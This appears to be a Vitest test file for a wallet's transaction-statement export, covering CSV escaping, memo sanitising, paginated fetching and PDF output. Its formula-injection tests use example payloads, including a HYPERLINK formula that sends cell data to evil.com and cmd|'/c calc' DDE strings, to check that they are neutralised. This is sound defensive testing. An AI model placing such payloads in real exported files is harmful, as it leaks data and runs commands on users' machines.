import { describe, expect, it, vi } from 'vitest';
import { STATEMENT_COLUMNS } from '@ancore/types';

import {
  fetchStatementRows,
  neutralizeCsvFormula,
  sanitizeMemo,
  toStatementCsv,
  StatementExportService,
} from '../statement-export';

const row = {
  id: 'row-1',
  timestamp: '2026-04-24T10:00:00.000Z',
  counterparty: 'Acme Treasury',
  amount: '142.50',
  asset: 'USDC',
  status: 'completed' as const,
  memoOrReference: 'Invoice 1042',
};

describe('statement export schema', () => {
  it('locks statement column order and CSV headers', () => {
    expect(STATEMENT_COLUMNS.map((column) => column.key)).toEqual([
      'timestamp',
      'counterparty',
      'amount',
      'asset',
      'status',
      'memoOrReference',
    ]);
    expect(toStatementCsv([row]).split('\n')[0]).toBe(
      'Timestamp,Counterparty,Amount,Asset,Status,Memo/Reference'
    );
  });

  it('escapes CSV cells without changing column order', () => {
    const csv = toStatementCsv([{ ...row, memoOrReference: 'Invoice, "special"' }]);

    expect(csv).toContain('"Invoice, ""special"""');
    expect(csv.split('\n')[1]).toBe(
      '2026-04-24T10:00:00.000Z,Acme Treasury,142.50,USDC,completed,"Invoice, ""special"""'
    );
  });
});

describe('toStatementCsv', () => {
  it('returns only headers for an empty row array', () => {
    const csv = toStatementCsv([]);
    const lines = csv.split('\n');
    expect(lines).toHaveLength(1);
    expect(lines[0]).toBe('Timestamp,Counterparty,Amount,Asset,Status,Memo/Reference');
  });

  it('renders a single row correctly', () => {
    const csv = toStatementCsv([row]);
    const lines = csv.split('\n');
    expect(lines).toHaveLength(2);
    expect(lines[1]).toContain('142.50');
    expect(lines[1]).toContain('USDC');
    expect(lines[1]).toContain('Acme Treasury');
  });

  it('renders multiple rows', () => {
    const row2 = { ...row, id: 'row-2', amount: '99.99', asset: 'XLM' };
    const csv = toStatementCsv([row, row2]);
    const lines = csv.split('\n');
    expect(lines).toHaveLength(3);
  });

  it('handles rows with empty memo', () => {
    const csv = toStatementCsv([{ ...row, memoOrReference: '' }]);
    const lines = csv.split('\n');
    expect(lines).toHaveLength(2);
    expect(lines[1]).toContain('completed,');
    expect(lines[1].endsWith(',')).toBe(true);
  });

  it('handles rows with commas in counterparty', () => {
    const csv = toStatementCsv([{ ...row, counterparty: 'Acme, Inc.' }]);
    expect(csv).toContain('"Acme, Inc."');
  });

  it('handles rows with newlines in memo', () => {
    const csv = toStatementCsv([{ ...row, memoOrReference: 'Line 1\nLine 2' }]);
    expect(csv).toContain('"Line 1\nLine 2"');
  });

  it('doubles inner quotes for proper RFC 4180 escaping', () => {
    const csv = toStatementCsv([{ ...row, memoOrReference: 'Say "hello"' }]);
    expect(csv).toContain('Say ""hello""');
  });
});

describe('CSV formula injection (CWE-1236)', () => {
  it('neutralises a HYPERLINK payload smuggled through a memo', () => {
    const csv = toStatementCsv([{ ...row, memoOrReference: '=HYPERLINK("http://evil.com?"&A1)' }]);

    // Quoted because of the comma-free but quote-bearing payload; the key
    // assertion is that the cell no longer starts with `=`.
    expect(csv).toContain('\'=HYPERLINK(""http://evil.com?""&A1)');
    expect(csv).not.toContain(',=HYPERLINK');
  });

  it.each(['=', '+', '-', '@'])('neutralises a leading %s in a memo', (prefix) => {
    const csv = toStatementCsv([{ ...row, memoOrReference: `${prefix}cmd|'/c calc'!A0` }]);
    expect(csv.split('\n')[1].endsWith(`'${prefix}cmd|'/c calc'!A0`)).toBe(true);
  });

  it('neutralises a formula in the attacker-influenceable counterparty column', () => {
    const csv = toStatementCsv([{ ...row, counterparty: '@SUM(1+1)*cmd' }]);
    expect(csv.split('\n')[1]).toContain(",'@SUM(1+1)*cmd,");
  });

  it('neutralises leading whitespace-prefixed formulas Excel would still evaluate', () => {
    expect(neutralizeCsvFormula('\t=1+1')).toBe("'\t=1+1");
    expect(neutralizeCsvFormula('\r=1+1')).toBe("'\r=1+1");
  });

  it('leaves negative amounts untouched so they stay numeric', () => {
    const csv = toStatementCsv([{ ...row, amount: '-142.50' }]);
    expect(csv.split('\n')[1]).toContain(',-142.50,');
    expect(csv).not.toContain("'-142.50");
  });

  it('leaves ordinary text and headers untouched', () => {
    expect(neutralizeCsvFormula('Invoice 1042')).toBe('Invoice 1042');
    expect(neutralizeCsvFormula('')).toBe('');
    expect(toStatementCsv([]).split('\n')[0]).toBe(
      'Timestamp,Counterparty,Amount,Asset,Status,Memo/Reference'
    );
  });

  it('quotes as well as neutralises when the payload also contains a comma', () => {
    const csv = toStatementCsv([{ ...row, memoOrReference: '=1,2' }]);
    expect(csv).toContain('"\'=1,2"');
  });
});

describe('sanitizeMemo', () => {
  it('passes through normal text unchanged', () => {
    expect(sanitizeMemo('Invoice 1042')).toBe('Invoice 1042');
  });

  it('strips C0 control characters', () => {
    expect(sanitizeMemo('Invoice\x00\x01\x1F 1042')).toBe('Invoice 1042');
  });

  it('preserves tabs', () => {
    expect(sanitizeMemo('Invoice\t1042')).toBe('Invoice\t1042');
  });

  it('normalises line breaks to spaces', () => {
    expect(sanitizeMemo('Line 1\r\nLine 2\nLine 3\rLine 4')).toBe('Line 1 Line 2 Line 3 Line 4');
  });

  it('trims leading and trailing whitespace', () => {
    expect(sanitizeMemo('  Invoice 1042  ')).toBe('Invoice 1042');
  });

  it('returns empty string for whitespace-only input', () => {
    expect(sanitizeMemo('   ')).toBe('');
  });

  it('handles empty string', () => {
    expect(sanitizeMemo('')).toBe('');
  });

  it('strips null bytes from untrusted memo fields', () => {
    expect(sanitizeMemo('Invoice\x00 1042')).toBe('Invoice 1042');
  });
});

describe('fetchStatementRows', () => {
  it('applies account and date filters to bounded indexer fetches', async () => {
    const fetcher = vi.fn(async () =>
      Response.json({
        rows: [
          {
            id: 'row-1',
            amount: '142.50',
            asset: 'USDC',
            counterparty: 'Acme Treasury',
            timestamp: row.timestamp,
            status: 'completed',
            memo_or_reference: 'Invoice 1042',
          },
        ],
        next_cursor: null,
      })
    );

    const rows = await fetchStatementRows(
      {
        accountId: 'GABC1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890',
        from: '2026-04-01T00:00:00.000Z',
        to: '2026-04-30T23:59:59.999Z',
      },
      fetcher as unknown as typeof fetch
    );

    const requestedUrl = new URL((fetcher.mock.calls as unknown as string[][])[0][0]);
    expect(requestedUrl.pathname).toContain(
      '/api/v1/accounts/GABC1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890/statements/rows'
    );
    expect(requestedUrl.searchParams.get('from_date')).toBe('2026-04-01T00:00:00.000Z');
    expect(requestedUrl.searchParams.get('to_date')).toBe('2026-04-30T23:59:59.999Z');
    expect(requestedUrl.searchParams.get('limit')).toBe('100');
    expect(rows[0]).toMatchObject(row);
  });

  it('returns empty array when indexer returns no rows', async () => {
    const fetcher = vi.fn(async () => Response.json({ rows: [], next_cursor: null }));

    const rows = await fetchStatementRows(
      {
        accountId: 'GABC1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890',
        from: '2026-04-01T00:00:00.000Z',
        to: '2026-04-30T23:59:59.999Z',
      },
      fetcher as unknown as typeof fetch
    );

    expect(rows).toEqual([]);
  });

  it('paginates through multiple pages', async () => {
    const fetcher = vi
      .fn()
      .mockResolvedValueOnce(
        Response.json({
          rows: [
            {
              id: 'r1',
              amount: '10',
              asset: 'XLM',
              timestamp: '2026-04-01T00:00:00Z',
              status: 'completed',
            },
          ],
          next_cursor: 'cursor-1',
        })
      )
      .mockResolvedValueOnce(
        Response.json({
          rows: [
            {
              id: 'r2',
              amount: '20',
              asset: 'USDC',
              timestamp: '2026-04-02T00:00:00Z',
              status: 'completed',
            },
          ],
          next_cursor: null,
        })
      );

    const rows = await fetchStatementRows(
      {
        accountId: 'GABC1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890',
        from: '2026-04-01T00:00:00.000Z',
        to: '2026-04-30T23:59:59.999Z',
      },
      fetcher as unknown as typeof fetch
    );

    expect(rows).toHaveLength(2);
    expect(fetcher).toHaveBeenCalledTimes(2);

    const secondUrl = new URL(fetcher.mock.calls[1][0]);
    expect(secondUrl.searchParams.get('cursor_after')).toBe('cursor-1');
  });

  it('throws on non-ok response', async () => {
    const fetcher = vi.fn(async () => new Response(null, { status: 500 }));

    await expect(
      fetchStatementRows(
        {
          accountId: 'GABC1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890',
          from: '2026-04-01T00:00:00.000Z',
          to: '2026-04-30T23:59:59.999Z',
        },
        fetcher as unknown as typeof fetch
      )
    ).rejects.toThrow('Unable to fetch statement rows');
  });

  it('throws for empty account id', async () => {
    const fetcher = vi.fn();

    await expect(
      fetchStatementRows(
        { accountId: '', from: '2026-04-01T00:00:00.000Z', to: '2026-04-30T23:59:59.999Z' },
        fetcher as unknown as typeof fetch
      )
    ).rejects.toThrow('Choose an account');
  });

  it('throws for invalid date range', async () => {
    const fetcher = vi.fn();

    await expect(
      fetchStatementRows(
        { accountId: 'GABC', from: 'not-a-date', to: '2026-04-30T23:59:59.999Z' },
        fetcher as unknown as typeof fetch
      )
    ).rejects.toThrow('valid statement date range');
  });

  it('throws when start date is after end date', async () => {
    const fetcher = vi.fn();

    await expect(
      fetchStatementRows(
        {
          accountId: 'GABC',
          from: '2026-04-30T00:00:00.000Z',
          to: '2026-04-01T00:00:00.000Z',
        },
        fetcher as unknown as typeof fetch
      )
    ).rejects.toThrow('start date must be before');
  });
});

describe('StatementExportService', () => {
  it('fetchRows returns normalized rows', async () => {
    const service = new StatementExportService();
    const fetcher = vi.fn(async () =>
      Response.json({
        rows: [
          {
            id: 'row-1',
            amount: '142.50',
            asset: 'USDC',
            counterparty: 'Acme Treasury',
            timestamp: row.timestamp,
            status: 'completed',
            memo_or_reference: 'Invoice 1042',
          },
        ],
        next_cursor: null,
      })
    );

    vi.stubGlobal('fetch', fetcher);

    const result = await service.fetchRows({
      accountId: 'GABC1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890',
      from: '2026-04-01T00:00:00.000Z',
      to: '2026-04-30T23:59:59.999Z',
    });

    expect(result.rows).toHaveLength(1);
    expect(result.rows[0].memoOrReference).toBe('Invoice 1042');
    expect(result.rows[0].asset).toBe('USDC');

    vi.unstubAllGlobals();
  });

  it('export returns CSV blob for csv format', async () => {
    const service = new StatementExportService();
    const fetcher = vi.fn(async () =>
      Response.json({
        rows: [
          {
            id: 'row-1',
            amount: '142.50',
            asset: 'USDC',
            counterparty: 'Acme Treasury',
            timestamp: row.timestamp,
            status: 'completed',
            memo_or_reference: 'Invoice 1042',
          },
        ],
        next_cursor: null,
      })
    );

    vi.stubGlobal('fetch', fetcher);

    const result = await service.export(
      {
        accountId: 'GABC1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890',
        from: '2026-04-01T00:00:00.000Z',
        to: '2026-04-30T23:59:59.999Z',
      },
      'csv'
    );

    expect(result.mimeType).toContain('text/csv');
    expect(result.filename).toMatch(/\.csv$/);
    expect(result.blob).toBeInstanceOf(Blob);

    vi.unstubAllGlobals();
  });

  it('export returns PDF blob for pdf format', async () => {
    const service = new StatementExportService();
    const fetcher = vi.fn(async () =>
      Response.json({
        rows: [
          {
            id: 'row-1',
            amount: '142.50',
            asset: 'USDC',
            counterparty: 'Acme Treasury',
            timestamp: row.timestamp,
            status: 'completed',
            memo_or_reference: 'Invoice 1042',
          },
        ],
        next_cursor: null,
      })
    );

    vi.stubGlobal('fetch', fetcher);

    const result = await service.export(
      {
        accountId: 'GABC1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890',
        from: '2026-04-01T00:00:00.000Z',
        to: '2026-04-30T23:59:59.999Z',
      },
      'pdf'
    );

    expect(result.mimeType).toBe('application/pdf');
    expect(result.filename).toMatch(/\.pdf$/);
    expect(result.blob).toBeInstanceOf(Blob);

    vi.unstubAllGlobals();
  });

  it('export handles empty rows gracefully', async () => {
    const service = new StatementExportService();
    const fetcher = vi.fn(async () => Response.json({ rows: [], next_cursor: null }));

    vi.stubGlobal('fetch', fetcher);

    const csvResult = await service.export(
      {
        accountId: 'GABC1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890',
        from: '2026-04-01T00:00:00.000Z',
        to: '2026-04-30T23:59:59.999Z',
      },
      'csv'
    );

    // Blob in jsdom — read via slice + text fallback
    const csvText = await new Promise<string>((resolve) => {
      const reader = new FileReader();
      reader.onload = () => resolve(reader.result as string);
      reader.readAsText(csvResult.blob);
    });
    expect(csvText.split('\n')).toHaveLength(1); // header only

    const pdfResult = await service.export(
      {
        accountId: 'GABC1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890',
        from: '2026-04-01T00:00:00.000Z',
        to: '2026-04-30T23:59:59.999Z',
      },
      'pdf'
    );

    expect(pdfResult.blob.size).toBeGreaterThan(0);

    vi.unstubAllGlobals();
  });
});
